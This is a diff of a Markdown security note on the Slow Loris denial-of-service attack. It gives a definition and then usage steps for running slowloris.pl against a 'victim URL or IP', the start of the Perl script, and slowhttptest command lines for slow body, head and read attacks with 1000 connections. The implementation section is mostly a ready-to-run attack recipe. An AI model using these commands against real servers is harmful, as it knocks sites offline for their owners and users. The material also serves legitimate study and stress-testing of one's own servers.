@@ -1,22 +1,21 @@
 ---
-publish: true
-title: Slow Loris
+title: "Slow Loris"
 created: 2019-10-08T22:12:37.877-05:00
 modified: 2023-05-07T12:09:23.896-05:00
+parent: "[[Denial of Service (DoS)]]"
+children: []
 ---
-
 ###### Slow Loris
-
-```excerpt
+````excerpt
 - is a type of [[Denial of Service (DoS)|denial-of-service]] attack tool by keeping many connections to the target web server open and holds them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to—but never completing—the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, and eventually denying additional connection attempts from clients
-```
-
+````
 ^excerpt
 
 # Implementation
 
 > [!expand]- perl
-> Requirements: <span style="white-space: pre-wrap"><code>sudo apt-get update  </code><br><code>sudo apt-get install perl </code><br><code>sudo apt-get install libwww-mechanize-shell-perl</code><br><code>sudo apt-get install perl-mechanize</code></span>
+> Requirements:
+> <span style="white-space: pre-wrap"><code>sudo apt-get update  </code><br><code>sudo apt-get install perl </code><br><code>sudo apt-get install libwww-mechanize-shell-perl</code><br><code>sudo apt-get install perl-mechanize</code></span>
 >
 > 1. Download [slowloris.pl](http://slowloris.pl/)
 > 2. Open Terminal
@@ -25,7 +24,6 @@ modified: 2023-05-07T12:09:23.896-05:00
 > 5. perl [slowloris.pl](http://slowloris.pl/) -dns (Victim URL or IP) -options
 >
 > [slowloris.pl](http://slowloris.pl/)
->
 > ```perl
 > #!/usr/bin/perl -w
 > use strict;
@@ -324,20 +322,24 @@ modified: 2023-05-07T12:09:23.896-05:00
 > ```
 
 > [!expand]- slowhttptest
->
 > # Installation
 >
-> > [!expand]- homebrew <strong>1. install slowhttptes</strong>t <span style="white-space: pre-wrap"><code>  brew update && brew install slowhttptest</code></span>
+> > [!expand]- homebrew
+> > <strong>1. install slowhttptes</strong>t
+> > <span style="white-space: pre-wrap"><code>  brew update && brew install slowhttptest</code></span>
 > >
-> > <strong>2. verify slowhttptest was installed</strong> <span style="white-space: pre-wrap"><code>   which slowhttptest</code></span>
->
+> > <strong>2. verify slowhttptest was installed</strong>
+> > <span style="white-space: pre-wrap"><code>   which slowhttptest</code></span>
 > # Commands
 >
 > > [!expand]- Click here to expand...
-> > <https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage>
+> > [https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage](https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage)
 > >
-> > <strong>1. Example of usage in slow body mode:</strong> <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port]/ -x 10 -p 3 -B -s 8192</code></span>
+> > <strong>1. Example of usage in slow body mode:</strong>
+> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port\]/ -x 10 -p 3 -B -s 8192</code></span>
 > >
-> > <strong>2. Example of usage in slow head mode:</strong> <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port]/ -x 10 -p 3 -H</code></span>
+> > <strong>2. Example of usage in slow head mode:</strong>
+> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port\]/ -x 10 -p 3 -H</code></span>
 > >
-> > <strong>3. Example of usage in slow read mode with probing through proxy at x.x.x.x:8080 to have website availability from IP different than yours:</strong> <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u https://host\[:port]/ -p 5 -l 350 -e x.x.x.x:8080</code></span>
+> > <strong>3. Example of usage in slow read mode with probing through proxy at x.x.x.x:8080 to have website availability from IP different than yours:</strong>
+> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u https://host\[:port\]/ -p 5 -l 350 -e x.x.x.x:8080</code></span>
